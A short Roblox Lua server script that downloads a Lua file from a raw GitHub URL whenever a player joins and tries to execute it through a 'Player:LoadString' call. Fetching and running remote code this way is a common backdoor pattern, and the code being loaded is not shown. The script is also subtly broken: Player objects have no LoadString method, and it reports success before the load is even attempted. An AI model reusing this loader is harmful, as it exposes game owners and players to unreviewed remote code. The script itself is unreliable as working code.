HTTPService = game:GetService("HttpService")

PlayerAdded = function(Player)
	local Success, Error = pcall(function()
		print(Player.Name.." successfully loaded the external code.")
		Player:LoadString(HTTPService:GetAsync("https://raw.githubusercontent.com/Nocticide/r-lobby/main/Client.lua"))
	end)
	if Error then
		print(Player.Name.." failed to load the external code.")
	end
end

game.Players.PlayerAdded:Connect(PlayerAdded)
repeat task.wait() until game.Players:FindFirstChildOfClass("Player")
PlayerAdded(game.Players:FindFirstChildOfClass("Player"))
